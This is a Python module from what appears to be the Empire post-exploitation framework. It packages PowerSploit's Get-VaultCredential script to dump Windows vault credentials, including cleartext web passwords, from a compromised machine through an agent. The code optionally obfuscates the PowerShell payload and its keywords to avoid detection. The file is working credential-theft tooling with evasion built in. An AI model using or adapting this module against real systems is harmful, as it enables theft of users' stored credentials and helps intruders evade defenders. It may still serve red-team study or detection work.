from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers
import threading

class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Get-VaultCredential',

            'Author': ['@mattifestation'],

            'Description': ("Runs PowerSploit's Get-VaultCredential to display "
                            "Windows vault credential objects including "
                            "cleartext web credentials."),

            'Software': 'S0194',

            'Techniques': ['T1503'],

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-VaultCredential.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # used to protect self.http and self.mainMenu.conn during threaded listener access
        self.lock = threading.Lock()

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Get-VaultCredential.ps1"
        if obfuscate:
            helpers.obfuscate_module(self.mainMenu , moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        
        scriptEnd = "Get-VaultCredential"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd

        # Get the random function name generated at install and patch the stager with the proper function name
        conn = self.get_db_connection()
        self.lock.acquire()
        script = helpers.keyword_obfuscation(script, conn)
        self.lock.release()

        return script
